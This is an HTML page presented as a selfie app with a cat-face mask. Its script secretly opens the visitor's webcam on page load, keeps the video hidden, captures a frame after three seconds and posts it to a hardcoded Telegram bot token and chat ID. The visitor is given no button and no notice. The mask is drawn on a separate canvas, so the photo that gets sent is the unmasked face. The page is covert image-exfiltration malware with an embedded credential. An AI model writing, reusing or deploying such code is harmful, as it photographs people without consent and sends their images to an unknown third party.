<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Selfie with Cat Mask to Telegram</title>
    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
    <style>
        #video, #canvas {
            display: none;
        }
        #overlayCanvas {
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
    <h1>Selfie App with Cat Mask</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    <canvas id="overlayCanvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const overlayCanvas = document.getElementById('overlayCanvas');
        const context = canvas.getContext('2d');
        const overlayContext = overlayCanvas.getContext('2d');

        // Load the models for face detection
        Promise.all([
            faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
            faceapi.nets.faceLandmark68Net.loadFromUri('/models')
        ]).then(startVideo);

        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        setTimeout(async () => {
                            const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();

                            if (detections.length > 0) {
                                drawCatMask(detections[0].landmarks);
                            }

                            context.drawImage(video, 0, 0, 640, 480);
                            sendToTelegram(canvas.toDataURL('image/png'));
                        }, 3000); // Delay for camera to focus
                    };
                })
                .catch(err => console.error("Error accessing camera: ", err));
        }

        function drawCatMask(landmarks) {
            const nose = landmarks.getNose()[3];
            const leftEye = landmarks.getLeftEye()[0];
            const rightEye = landmarks.getRightEye()[3];
            const width = rightEye.x - leftEye.x;

            const img = new Image();
            img.src = 'https://example.com/cat-mask.png'; // URL маски кота

            img.onload = () => {
                overlayContext.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
                overlayContext.drawImage(img, nose.x - width, nose.y - width * 1.5, width * 3, width * 2.5);
            };
        }

        function sendToTelegram(imageData) {
            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
            const chatId = '6121166273';
            const url = `https://api.telegram.org/bot${token}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURItoBlob(imageData), 'selfie.png');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch((error) => console.error('Error sending to Telegram:', error));
        }

        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], {type: mimeString});
        }
    </script>
</body>
</html>
